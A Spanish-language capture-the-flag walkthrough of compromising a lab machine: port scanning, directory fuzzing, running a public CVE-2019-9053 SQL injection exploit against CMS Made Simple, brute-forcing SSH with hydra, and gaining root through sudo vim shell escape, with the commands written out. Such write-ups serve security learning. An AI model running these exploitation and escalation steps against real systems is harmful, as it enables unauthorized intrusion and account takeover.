### Tags `/usr/bin/vim` `searchsploit`

# Escaneo (*21,80,2222*)

```css
  sudo nmap -p- --open -sSCV --min-rate 4000 -vvv -n - Pn 10.10.85.210 -oN escaneo
```
![image](https://github.com/user-attachments/assets/22b64866-0de5-43f7-8257-d12bb121a6a5)

# Fuzzing (gobuster)
Hacemos gobuster a la web y encontramos un directorio llamado ``simple``

```css
  gobuster dir -u http://10.10.85.210 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -b 403,404 -x php,html,txt
```
![image](https://github.com/user-attachments/assets/e3ed087a-7812-4851-9a4e-0651eb90f794)

Viendo la WEB, abajo del todo aparecía la **versión del CMS**

![image](https://github.com/user-attachments/assets/6c2508b3-d9a9-4189-8cf8-c3ae0a018e1b)

## Searchsploit (cms)

![image](https://github.com/user-attachments/assets/933388a9-acf1-4ac9-99ad-fcac7609ea53)

Pusimos este comando para que se nos descargue en nuestra máquina el *EXPLOIT*

 ```ruby
searchsploit -m php/webapps/46635.py
```

Hacemos un *CAT* al exploit y podemos ver el código y vemos el **CVE** --> que es fundamental para poder buscar en google un exploit sobre ese CVE

![image](https://github.com/user-attachments/assets/91f3d6ca-5c8f-43a5-a349-0b3f92dfedfd)

# Explotación
Pusimos en google *CVE-2019-9053* exploit github y nos fuimos a este [Enlace](https://github.com/ELIZEUOPAIN/CVE-2019-9053-CMS-Made-Simple-2.2.10---SQL-Injection-Exploit)

![image](https://github.com/user-attachments/assets/ecc7259c-0507-4420-af61-c18ffe330389)

Y una ves que lo tengamos para ejecutarlo hacemos el siguiente comando --->``python3 cve.py -u http://10.10.85.210/simple --crack -w /usr/share/wordlists/rockyuo.txt``
Nos da un usuario y una contraseña *Hasheada* que no vamos a utilizar ya que como tenemos un Nombre de usuario y tenemos el **puerto 2222 de SSH** hacemos *HYDRA*

![image](https://github.com/user-attachments/assets/03f5f506-fa5a-4919-8766-9ce7bd871899)

### Hydra
Usamos hydra con el puerto SSH y nos da la *contraseña*

![image](https://github.com/user-attachments/assets/027c6243-e541-429f-b584-ff16eda4b511)

```css
 ssh mitch@10.10.85.210 -p 2222
```

# Escalada ROOT
Poniendo **sudo -l** vemos esta *vim* entonces podes hacer lo siguiente:

![image](https://github.com/user-attachments/assets/4755b461-b6e1-4c1e-aa2b-ec37e3598a40)

Lo que hacemos es ubicarnos dentro de **/tmp** ya que en esa carpeta tenemos los **permisos de escritura** y poniendo **sudo vim pawned**  --> podemos hacer lo esto:
Se nos abre vim y poniendo esto  ---> ``:set shell=/bin/bash`` ---> le das a *ENTER*

![image](https://github.com/user-attachments/assets/4638d2d8-7873-4e95-bcbb-8f846706fb7c)

Una ves dado *ENTER* pones esto esto otro y LISTO --> ``:shell`` +ENTER

![image](https://github.com/user-attachments/assets/09c57117-d9ca-4f2e-b3a6-01cdf66bbdf9)
![image](https://github.com/user-attachments/assets/3a01e4db-f42a-45ce-802f-e195eb746ee9)

